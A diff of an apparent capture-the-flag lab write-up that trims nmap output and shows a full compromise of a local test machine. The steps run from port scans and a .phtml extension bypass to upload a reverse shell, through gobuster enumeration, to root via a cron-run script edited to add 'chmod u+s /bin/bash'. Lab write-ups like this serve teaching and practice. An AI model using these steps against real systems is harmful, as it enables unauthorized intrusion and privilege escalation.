@@ -21,38 +21,24 @@ tags:
 
 ```bash
 sudo nmap -p- -sS --min-rate 5000 -vvv -n -Pn 192.168.1.111
-Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-13 19:01 CEST
-Initiating ARP Ping Scan at 19:01
-Scanning 192.168.1.111 [1 port]
-Completed ARP Ping Scan at 19:01, 0.05s elapsed (1 total hosts)
-Initiating SYN Stealth Scan at 19:01
-Scanning 192.168.1.111 [65535 ports]
-Discovered open port 80/tcp on 192.168.1.111
-Completed SYN Stealth Scan at 19:01, 0.79s elapsed (65535 total ports)
-Nmap scan report for 192.168.1.111
-Host is up, received arp-response (0.000041s latency).
-Scanned at 2024-06-13 19:01:05 CEST for 1s
-Not shown: 65534 closed tcp ports (reset)
+
 PORT   STATE SERVICE REASON
 80/tcp open  http    syn-ack ttl 64
-MAC Address: 00:0C:29:FD:18:1D (VMware)
-
-Read data files from: /usr/bin/../share/nmap
-Nmap done: 1 IP address (1 host up) scanned in 1.00 seconds
-           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
+MAC Address: 00:0C:29:B0:92:23 (VMware)
 ```
 
 ## Service Discovery
 
 ```bash
+sudo nmap -sV -sC -vvv -p 80 192.168.1.119
+
 PORT   STATE SERVICE REASON         VERSION
 80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.57 ((Debian))
-| http-methods:
-|_  Supported Methods: OPTIONS HEAD GET POST
-|_http-title: Diff3r3ntS3c
+|_http-title: HackingStation
 |_http-server-header: Apache/2.4.57 (Debian)
-MAC Address: 00:0C:29:FD:18:1D (VMware)
+| http-methods: 
+|_  Supported Methods: OPTIONS HEAD GET POST
+MAC Address: 00:0C:29:B0:92:23 (VMware)
 ```
 
 ## Method 1
@@ -69,6 +55,7 @@ If we try to upload a .php file, we get the following error:
 After trying several extensions, we get the correct one -> *.phtml*
 
 To see where the uploaded file is located, we perform a scan with gobuster:
+
 ```bash
 gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.111/
 ===============================================================
@@ -93,6 +80,7 @@ Progress: 220560 / 220561 (100.00%)
 ===============================================================
 Finished
 ```
+
 We can see that we have a directory called /uploads where the files we upload will be stored.
 
 If we check this directory, we can see that the file with a reverse shell that we uploaded is there. If we execute it, we get a reverse shell.
@@ -109,6 +97,7 @@ uid=1000(candidate) gid=1000(candidate) groups=1000(candidate)
 ```
 
 Once we have the reverse shell, we try to escalate privileges. To do this, we check if there is any suspicious task running with crontab
+
 ```bash
 cat /etc/crontab
 # /etc/crontab: system-wide crontab
@@ -141,6 +130,7 @@ As we can see in the result, we have a script that we can execute as root in the
 We can modify this script to get a root shell with the following line `chmod u+s /bin/bash`
 
 We wait for the task to run again and then execute the command `bash -p` to get the root shell:
+
 ```bash
 bash-5.2# whoami
 root
